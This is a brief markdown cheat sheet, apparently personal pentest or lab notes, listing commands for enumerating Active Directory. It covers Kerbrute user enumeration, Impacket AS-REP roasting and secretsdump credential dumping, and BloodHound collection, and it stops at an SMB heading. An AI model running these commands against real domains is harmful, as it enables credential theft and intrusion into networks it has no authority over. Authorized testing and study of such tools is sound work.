# Enumerating things on Windows

## Active Directory

### Kerbrute

```sh
kerbrute userenum --dc domaincontroller -d domain.tld /path/to/userlist
```

### Impacket

- ASRepRoast
```sh
/usr/local/bin/GetNPUsers.py domain.tld/ -dc-ip domaincontroller -usersfile validuserlist
```

- Dump Secret
```sh
/usr/local/bin/secretsdump.py -dc-ip 0.0.0.0 domain.tld/username:password@0.0.0.0
```

### Bloodhound

```
pip3 install bloodhound
python3 -m bloodhound -d domain.tld -u username -p "password" -gc dc.domain.tld -c all -ns 0.0.0.0
```

## SMB

### Enum4Linux

- Enumerate SMB Shares
  